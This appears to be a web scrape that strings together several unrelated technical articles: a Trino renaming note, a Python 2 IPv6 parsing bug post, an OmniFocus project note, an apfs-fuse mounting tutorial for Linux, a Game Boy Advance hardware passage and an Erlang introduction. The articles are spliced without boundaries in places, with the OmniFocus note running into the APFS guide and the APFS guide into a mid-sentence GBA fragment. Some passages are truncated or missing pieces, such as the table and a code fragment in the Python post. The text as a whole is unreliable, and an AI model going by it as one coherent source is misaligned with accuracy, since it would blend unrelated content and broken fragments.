<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>

  <article>  
    
    <p>2020-12-28</p>
    
<p>Hello! Welcome to the once-yearly blog post! This year I'd like to examine the
most peculiar bug I encountered at work. To set the stage, let's start with a
little background. 📚</p>
<p>When we write <a href="https://en.wikipedia.org/wiki/URL">URLs</a> with a <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">non-standard</a> <a href="https://en.wikipedia.org/wiki/Port_(computer_networking)">port</a> we
specify the port after a <code>:</code>. With <a href="https://en.wikipedia.org/wiki/Hostname">hostnames</a> and <a href="https://en.wikipedia.org/wiki/IPv4#Addressing">IPv4</a> addresses
this is straightforward. Here's some <a href="https://www.python.org/">Python</a> code to show how easy it is.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://node.example.com:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'node.example.com'</span><span>, </span><span>8000</span><span>)
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(</span><span>"https://192.168.0.1:8000"</span><span>)
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'192.168.0.1'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Unfortunately, when <a href="https://en.wikipedia.org/wiki/IPv6#Addressing">IPv6</a> addresses are involved some ambiguity is introduced.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://fdc8:bf8b:e62c:abcd:1111:2222:3333:4444:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>url.hostname
</span><span>'fdc8'
</span><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>url.port
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>...
Port could </span><span>not </span><span>be cast to integer value </span><span>as</span><span> </span><span>'bf8b:e62c:abcd:1111:2222:3333:4444:8000'
</span></code></pre>
<p>Since IPv6 addresses use a "colon-hex" format with <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> fields
separated by <code>:</code> we can't tell a port apart from a normal field. Notice in the
example above that the hostname is truncated after the first <code>:</code>, not the one
just before <code>8000</code>.</p>
<p>Fortunately, the spec for URLs recognizes this ambiguity and gives us a way to
handle it. <a href="https://www.ietf.org/rfc/rfc2732.txt">RFC 2732 (<em>Format for Literal IPv6 Addresses in URL's</em>)</a>
says</p>
<blockquote>
<p>To use a literal IPv6 address in a URL, the literal address should be
enclosed in "[" and "]" characters.</p>
</blockquote>
<p>Update our example above to include <code>[</code> and <code>]</code> and voilà! It just works.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'fdc8:bf8b:e62c:abcd:1111:2222:3333:4444'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Armed with that knowledge we can dive into the problem. 🤿</p>

<p>A few months ago a co-worker of mine wrote a seemingly innocuous function.</p>
<pre><code><span>from </span><span>ipaddress </span><span>import </span><span>ip_address


</span><span>def </span><span>safe_host</span><span>(</span><span>host</span><span>): 
    </span><span>"""Surround `host` with brackets if it is an IPv6 address."""
    </span><span>try</span><span>:
        </span><span>if </span><span>ip_address(host)</span><span>.version </span><span>== </span><span>6</span><span>:
            </span><span>return </span><span>"[</span><span>{}</span><span>]"</span><span>.format(host)
    </span><span>except </span><span>ValueError</span><span>:
        </span><span>pass
    return </span><span>host
</span></code></pre>
<p>Elsewhere in the code it was invoked something like this, so that hostnames,
IPv4 addresses, and IPv6 addresses could all be safely interpolated.</p>
<pre><code><span>url </span><span>= </span><span>"https://</span><span>{host}</span><span>:8000/some/path/"</span><span>.format(host</span><span>=</span><span>safe_host(host))
</span></code></pre>
<p>Since my co-worker is awesome they wrote tests to validate their code. ✅</p>
<pre><code><span>def </span><span>test_safe_host_with_hostname</span><span>():
    </span><span>"""Hostnames should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>"node.example.com"


</span><span>def </span><span>test_safe_host_with_ipv4_address</span><span>():
    </span><span>"""IPv4 addresses should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"192.168.0.1"</span><span>) </span><span>== </span><span>"192.168.0.1"


</span><span>def </span><span>test_safe_host_with_ipv6_address</span><span>():
    </span><span>"""IPv6 addresses should be surrounded by brackets."""
    </span><span>assert </span><span>(
        </span><span>safe_host(</span><span>"fdc8:bf8b:e62c:abcd:1111:2222:3333:4444"</span><span>)
        </span><span>== </span><span>"[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]"
    </span><span>)
</span></code></pre>
<p>Thank goodness they did. The Python 2 tests failed (<a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/#drop-python2">don't look at me like
that</a> 😒).</p>
<pre><code><span>✖ </span><span>FAIL</span><span> py27 in </span><span>1</span><span>.</span><span>83</span><span> seconds

</span></code></pre>
<p>Both the hostname and IPv6 address tests failed. But <em><strong>why</strong></em> did they fail?
And why did the Python 3 tests pass? 🤔</p>
<p>We'll start with the hostname failure and try to isolate the bug.</p>
<pre><code><span>E       </span><span>AssertionError</span><span>: </span><span>assert </span><span>'[node.example.com]' </span><span>== </span><span>'node.example.com'
</span><span>E         </span><span>- </span><span>[node.example.com]
E         ? </span><span>-                -
</span><span>E         </span><span>+ </span><span>node.example.com
</span></code></pre>
<p>The failure says <code>node.example.com</code> was surrounded by brackets, but that's
only supposed to happen for IPv6 addresses! Let's crack open a Python 2
interpreter for a quick sanity check.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)</span><span>.version
</span><span>6
</span></code></pre><img src="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/confused-jeff-bridges.webp" alt="Confused Jeff Bridges">

<p>If, like Jeff Bridges, you were confused by that result, <em>relax</em>. We're
probably not in a <a href="https://en.wikipedia.org/wiki/Bizarro_World">Bizarro World</a> where <code>node.example.com</code> is a valid IPv6
address. There must be an explanation for this behavior.</p>
<p>Things start to become a little more clear when we see the result of the
<a href="https://github.com/python/cpython/blob/v3.9.0/Lib/ipaddress.py#L27-L54"><code>ip_address()</code></a> function for ourselves.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>At first glance that looks like madness. Python 3 behaves in an entirely
different manner.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>... 
</span><span>'node.example.com' </span><span>does </span><span>not </span><span>appear to be an IPv4 </span><span>or </span><span>IPv6 address
</span></code></pre>
<p>Python 3 knows that's not an IPv6 address, so why doesn't Python 2? The answer
is in how differently the two Python versions handle text.</p>

<p>Computers don't operate on text as humans think of it. They operate on numbers.
That's part of why we have IP addresses to begin with. In order to represent
human-readable text with computers we had to assign meaning to the numbers.
Thus, <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> was born.</p>
<p>ASCII is a <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>, which means it specifies how to interpret
<a href="https://en.wikipedia.org/wiki/Byte">bytes</a> as text we understand (provided you speak English). So, when your
computer sees <code>01101110</code> in <a href="https://en.wikipedia.org/wiki/Binary_number">binary</a> (<code>110</code> in <a href="https://en.wikipedia.org/wiki/Decimal">decimal</a>) you see <code>n</code> because
that's what ASCII says it is.</p>
<p>You can see the number to text conversion in action right in the Python
interpreter.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ord</span><span>(</span><span>"n"</span><span>)
</span><span>110
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span></code></pre>
<p>In fact, it doesn't matter what numbering system you use. If you specify
binary, <a href="https://en.wikipedia.org/wiki/Octal">octal</a>, decimal, hexadecimal, whatever... If it can be understood as
the right integer it will be displayed correctly.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0b01101110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0o156</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0x6e</span><span>)
</span><span>'n'
</span></code></pre>
<p>Neat, but what does that information do for us?</p>

<p>Just for giggles, humor me and let's look at the character-number translations
for <code>node.example.com</code>. We'll leave out binary and octal, because they make
this table uglier than it already is.</p>

<p>Hey, hold on a second... If you tilt your head sideways and squint that last
row looks kinda like an IPv6 address, doesn't it?</p>
<p>We should verify, just to be absolutely certain. You've still got that Python 2
interpreter open, right?</p>

</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>== </span><span>address_without_colons
</span><span>True
</span></code></pre>
<p>Sure enough, when you boil them both down to numbers they're the same mess of
hexadecimal.</p>

<p>If we dig into the source code for the Python 2 version of the
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py"><code>ipaddress</code></a> module we ultimately come to a
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py#L2026-L2031">curious set of lines</a>.</p>
<pre><code><span># Constructing from a packed address
</span><span>if </span><span>isinstance</span><span>(address, </span><span>bytes</span><span>)</span><span>:
    </span><span>self._check_packed_address(address, </span><span>16</span><span>)
    </span><span>bvs </span><span>= </span><span>_compat_bytes_to_byte_vals(address)
    self</span><span>._ip </span><span>= </span><span>_compat_int_from_byte_vals(bvs, </span><span>'big'</span><span>)
    </span><span>return
</span></code></pre>
<p>It turns out that, under certain conditions, the <code>ipaddress</code> module can create
IPv6 addresses from raw bytes. My assumption is that it offers this behavior as
a convenient way to parse IP addresses from data fresh off the <a href="https://en.wikipedia.org/wiki/Wire_data">wire</a>.</p>
<p>Does <code>node.example.com</code> meet those certain conditions? You bet it does. Because
we're using Python 2 it's just <code>bytes</code> and it happens to be 16 characters long.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>isinstance</span><span>(</span><span>"node.example.com"</span><span>, </span><span>bytes</span><span>)
</span><span>True
</span><span>&gt;&gt;&gt; </span><span># `self._check_packed_address` basically just checks how long it is.
</span><span>&gt;&gt;&gt; </span><span>len</span><span>(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>16
True
</span></code></pre>
<p>The rest of the <code>ipaddress</code> lines say to interpret the sequence of bytes as a
<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer. That's <a href="https://docs.python.org/3.9/library/struct.html#struct.unpack">magic</a> best left
for another blog post, but the gist is that hexadecimal interpretation of
<code>node.example.com</code> is condensed into a single, <strong>huge</strong> number.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>int</span><span>(</span><span>"6e6f64652e6578616d706c652e636f6d"</span><span>, </span><span>16</span><span>)
</span><span>146793460745001871434687145741037825901</span><span>L
</span></code></pre>
<p>That's an absolutely massive number, but not so massive it won't fit within the
<a href="https://en.wikipedia.org/wiki/IPv6#Larger_address_space">IPv6 address space</a>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ip_address(</span><span>146793460745001871434687145741037825901</span><span>L</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>As it turns out, if you're liberal in your interpretation, <code>node.example.com</code>
<em>can</em> be an IPv6 address!</p>

<p>Obviously that's hogwash. Bizarro might be proud, but that's not what we wanted
to happen.</p>
<p>There's a quote about numbers which is apocryphally attributed to <a href="https://en.wikipedia.org/wiki/W._E._B._Du_Bois">W.E.B. Du
Bois</a>, but that actually comes from <a href="https://en.wikipedia.org/wiki/Harold_Geneen">Harold Geneen</a>'s book,
<a href="https://en.wikiquote.org/wiki/Harold_Geneen"><em>Managing</em></a>.</p>
<blockquote>
<p>When you have mastered the numbers, you will in fact no longer be reading
numbers, any more than you read words when reading a book. You will be
reading meanings.</p>
</blockquote>
<p>Having not read the book I'm probably taking the quote way out of context, but
I think it fits our situation well.</p>
<p>As we've seen above, we can freely convert characters to numbers and back
again. The root of our problem is that when we use Python 2 it considers text
to be bytes. There's not a deeper, inherent meaning. Maybe the bytes are meant
to be ASCII, maybe they're meant to be a long number, maybe they're meant to be
an IP address. The interpretation of those bytes is up to us.</p>
<p>Python 2 doesn't differentiate between bytes and text by default. In fact, the
<code>bytes</code> type is just an <a href="https://docs.python.org/3/whatsnew/2.6.html#pep-3112-byte-literals">alias</a> for <code>str</code>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>bytes
</span><span>&lt;</span><span>type </span><span>'str'</span><span>&gt;
&gt;&gt;&gt; </span><span>bytes </span><span>is </span><span>str
</span><span>True
</span></code></pre>
<p>To make that even more concrete, see how Python 2 considers <code>n</code> to be the same
as this sequence of raw bytes.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>"n" </span><span>== </span><span>b</span><span>"\x6e"
</span><span>True
</span></code></pre>
<p>Our Python 2 code doesn't work the way we want it to because raw bytes can have
arbitrary meaning and we haven't told it to use our intended meaning.</p>
<p>So now we know why Python 2 interprets <code>node.example.com</code> as an IPv6 address,
but why does Python 3 behave differently? More importantly, how can we
reconcile the two?</p>

<p>ASCII looked like a good idea in the 1960's. With decades of hindsight we
know the 256 characters …</p></article></main></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Today I cleaned up my various projects and todo’s in <a href="https://www.omnigroup.com/omnifocus">OmniFocus</a>. I am always collecting links and resources for potential project ideas, or for general learning. Sometimes, however, it is best to acknowledge that I will likely never have enough free time to even begin some of these endeavors.</p>

<!--excerpt-->

<p>One thing I love about OmniFocus is the concept of “dropping” a project or task, which neither deletes the item nor marks it as complete — a feature sorely lacking in most “Todo” apps. Dropping an item is similar to deletion, but it preserves the record in case you would ever like to return to it. It is removed from view, but you can find it again by searching.</p>

<p>Today I decided to “drop” my compilers project in OmniFocus. I may return to it one day. Maybe not. In any case, I figured others in the community who want to learn about compilers might find these resources valuable. I have only skimmed them, but they should provide a good starting point. I hope you succeed where I did not.</p>

<p>All of these notes (among many others) are also in my <a href="https://github.com/jessesquires/TIL/blob/main/compilers/README.md">TIL repo</a> on GitHub.</p>

<p>In 2017, Apple changed the default filesystem on their macOS (High Sierra and above) to APFS, he Apple File System. It replaced HFS+.</p>



<p>It works on a principle of using containers, rather than partitions. It has good cloning efficiencies, better encrytion, snapshot support as well as a few other benefits. </p>




<h2><span id="Proprietary_prattle"></span>Proprietary prattle<span></span></h2>



<p>As all things recent in the Apple world, they do not like to share things. Even when this could negatively impact their business. Take FaceTime, for example. If they had made that platform agnostic, meaning that people on Windows, Android and maybe even Linux/Web platforms could use it, then it is arguable that FaceTime would have taken much of the market share from the likes of Skype. APFS is no different. Apple haven’t shared the API, so it relies on people to do an extent of guesswork, detailed research and some reverse engineering. All of which is never a good thing when you are working on the systems that look after the integrity of your files!</p>

<p>For those of you that use Linux on a mac and still have a need to access your files on the Mac partition of your hard drive on occasion then you may find it a challenge. If you have any version of macOS prior ot 10.3 (High Sierra), then your mac will be using HFS<a href="https://linuxnewbieguide.org/how-to-install-linux-on-a-macintosh-computer/">+. Check out our comprehensive guide on using Linux on a mac</a> on how to mount your HFS+ partition as read/write.<span data-ez-name="linuxnewbieguide_org-box-4"></span></p>



<h2><span id="How_do_I_get_it_working"></span>How do I get it working?<span></span></h2>



<p>For the newer APFS users, fortunately, you can now use a driver called <a href="https://github.com/sgan81/apfs-fuse">apfs-fuse </a>to access your mac’s APFS disk. Note that this driver is not part of your Linux distribution and you will have to build it from source code. This short guide will show you how. </p>



<h3><span id="Bummer,_Read_only%E2%80%A6"></span>Bummer, Read only….<span></span></h3>



<p>Unfortunately, at least for now, you are limited to read-only access. The upshot of this is that no data can be damaged by any bugs that may exist in this experimental software. The driver’s associated mount tool will also not perform transparent LZFSE decompression. I have been using this tool for a number of weeks on my ‘Mojave’ macOS computer and it works well.</p>



<h3><span id="Get_tooled_up"></span>Get tooled up<span></span></h3>



<p>Firstly, I’d like to say that this is an entirely newbie friendly tutorial, however on this occasion, it’s all work at the <a href="https://linuxnewbieguide.org/overview-of-chapters/more-advanced-guides/i-dont-know-any-commands/">Terminal</a>. Don’t worry too much if you’re not used to working at the command line, you are safe to copy and paste the instructions.</p>



<p>Firstly, we need to have the appropriate tools in order to build the APFS-Fuse driver. Open your Terminal app and enter these commands:</p>



<pre><code>sudo apt update
sudo apt install libicu-dev bzip2 cmake libz-dev libbz2-dev fuse3 libfuse3-3 libfuse3-dev clang git libattr1-dev

On older versions of Ubuntu, you may need to use the following: sudo apt install fuse libfuse-dev libicu-dev bzip2 cmake libz-dev libbz2-dev clang git libattr1-dev</code></pre>



<p>Now we can download (clone) the driver source code with git:</p>



<pre><code>git clone https://github.com/sgan81/apfs-fuse.git
cd apfs-fuse
git submodule init
git submodule update</code></pre>



<p>After that’s done, it’s time to compile the downloaded source code:</p>



<pre><code>mkdir build
cd build
cmake ..
make</code></pre>



<p>After compilation, the binaries are located in the build directory.  I recommend copying the apfs* tools into a directory that can be accessed in the path, for example /usr/local/bin. To copy them simply do this:</p>



<pre><code>sudo cp apfs-* /usr/local/bin</code></pre>



<p>Now we need to find out which disk partition macOS is on. By using the fdisk -l command you’ll be able to see the layout of the disk. </p>



<pre><code>$sudo fdisk -l
--- 8&gt;--snipped the loop volumes--&lt;8 ---
Disk /dev/sda: 465.9 GiB, 500277790720 bytes, 977105060 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 4096 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
Disklabel type: gpt
Disk identifier: 6153AD88-FE14-4E88-8D9A-60E8AA465516

Device         Start       End   Sectors   Size Type
/dev/sda1         40    409639    409600   200M EFI System
/dev/sda2     409640 764593231 764183592 364.4G unknown
/dev/sda3  764594176 781570047  16975872   8.1G Microsoft basic data
/dev/sda4  781832192 976842751 195010560    93G Microsoft basic data
--- 8&gt;--snipped the loop volumes--&lt;8 ---</code></pre>



<p>You can see in my example above that there is a 364.4GB unknown partition. I know that this is my macOS partition because I know that the size of my macOS partition is 365GB. This means that the device identifier is /dev/sda2, so that’s what we will mount.</p>



<p>Let’s check it out and see if it works….</p>



<pre><code>sudo mkdir -p /media/$USERNAME/macos
sudo ./apfs-fuse -o allow_other /dev/sda2 /media/&lt;your userame&gt;/macos</code></pre>



<p>Hopefully, all going well, you won’t have received any error messages at this point. If you have, then perhaps the <a href="https://github.com/sgan81/apfs-fuse#apfs-fuse-driver-for-linux">README</a> file can provide some enlightenment. </p>

<h3><span id="Making_it_stick"></span>Making it stick<span></span></h3>



<p><span data-ez-name="linuxnewbieguide_org-medrectangle-4"></span>If you want to have your macos partition automatically mount every time you start up you computer, then you’ll need to edit into your filesystem table (fstab). To do this, we will need to make a symlink to the apfs mount tool, and then edit the fstab (if you don’t have nano, use vim):</p>



<pre><code>sudo ln -s /usr/local/bin/apfs-fuse /usr/sbin/mount.apfs
sudo nano /etc/fstab</code></pre>



<p>Add a line at the bottom of the file (all on one line) that says this:</p>



<pre><code>mount.apfs#/dev/sda2    /media/&lt;your username&gt;/macos/    fuse    user,allow_other        0       0</code></pre>



<p>If you want to see if that works immediately just unmount the disk (see the cleaning up section below). Then type sudo mount -a to mount the disk from the fstab.</p>



<h3><span id="Getting_to_know_your_partition"></span>Getting to know your partition<span></span></h3>



<p>When the partition is mounted, you will see two directories, private-dir and root. The directory root is the one you want. Inside there is the root filesystem of your mac. You’ll find your stuff in the ‘Users’ folder.</p>



<h3><span id="Cleaning_up_(Unmounting)"></span>Cleaning up (Unmounting)<span></span></h3>



<p>To unmount the macos directory properly, you should use the fusermount command:</p>



<pre><code>fusermount -u /media/&lt;your username&gt;/macos</code></pre>



<p>I hope this has helped you get access to your mac’s files. Please share this article and let me know how you get on in the comments section below.</p>

Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the Game Boy!</em> It’s effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new?</h4><p>Before ARM Holdings (currently “Arm”) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn’s computers, Apple’s Newton, Nokia’s phones and the Panasonic 3DO.
Nintendo’s chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU’s resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>

Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process. If instead we manipulate another one then none of the glitches will be shown to the user. Once the second bitmap is finished the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, we will look at a rather old and somewhat quirky language that most of you probably don’t have on your radars.</p><p>While Erlang is not as popular as some modern programming languages, it quietly runs applications like WhatsApp and WeChat that serve massive amounts of users every day.</p><p>In this article, I will tell you more about this language, its history, and whether you should think about learning it yourself.</p><h2 id="what-is-erlang%2C-and-where-is-it-used%3F">What is Erlang, and where is it used?</h2><p>Erlang is a functional, general-purpose language oriented towards building scalable, concurrent systems with high availability guarantees.</p><p>It was built at the end of the 1980s at Ericsson for handling telephone switches. At the time, telephone switching systems were one of the most complicated systems out there, like the internet is nowadays. For this reason, the language used to program them needed to support high concurrency and zero downtime.</p><p>After going through multiple existing language options, three guys at the company – Joe Armstrong, Robert Virding, and Mike Williams – decided to create their own. This led to one of the coolest programming languages and, perhaps, the most awesome <a href="https://www.youtube.com/watch?v=BXmOlCy0oBM">marketing video</a> for a language I’ve ever seen.</p><p><img src="https://serokell.io/files/qa/qap56dhf.1_(41)_(1).jpg" alt="Erlang logo" loading="lazy"></p><p>So, what distinguishes this language from all of the others?</p><h3 id="process-oriented">Process-oriented</h3><p>The main thing that distinguishes Erlang from other languages is its process-based computing model. It uses isolated, lightweight processes that communicate with each other through messages.</p><p>These processes can receive messages and, in response to messages, create new processes, send messages to other processes, or modify their state. In other words, Erlang follows the <a href="https://www.brianstorti.com/the-actor-model/">actor model</a>. If you’ve used Akka on JVM, you’ll feel right at home.</p><p><img src="https://serokell.io/files/nl/nlvg3wnn.2_(32)_(1).jpg" alt="Erlang processes actors" loading="lazy"></p><p>The processes are isolated, fast to create, and take up only a small amount of memory. It is easy to expand your system by creating more of them. Since the processes don’t discern whether the other processes are on the same core or in another place, you can easily scale both horizontally (by adding more machines) and vertically (by adding cores).</p><h3 id="functional">Functional</h3><p>People usually group Erlang as a functional programming language with other languages like Scala and Haskell. Some of FP characteristics are:</p><ul>
<li>frequent use of pure functions</li>
<li>higher-order functions</li>
<li>pattern matching</li>
</ul><p>More about functional programming you can find in our <a href="https://serokell.io/blog/introduction-to-functional-programming">introduction to FP</a>.</p><h3 id="what-is-erlang-good-for%3F">What is Erlang good for?</h3><p>Primarily, Erlang is a good choice whenever messaging between multiple agents across the network is involved, since that maps well on the basic structure of the language.</p><p>It is excellent for:</p><ul>
<li><strong>Chat apps.</strong> Messaging apps, including some famous examples like WeChat and WhatsApp, use Erlang to handle insane amounts of concurrent users. Erlang has a wonderful messaging platform called <a href="https://www.ejabberd.im/">ejabberd</a> that can be used to create large-scale chat apps.</li>
<li><strong>Message queue systems</strong>. <a href="https://www.rabbitmq.com/">RabbitMQ</a>, an open-source message broker that implements AMQP and other protocols, is a huge success story for Erlang.</li>
<li><strong>Blockchains.</strong> <a href="https://aeternity.com/">Aeternity</a>, a blockchain for scalable, secure, and decentralized dapps, uses Erlang for its node implementation.</li>
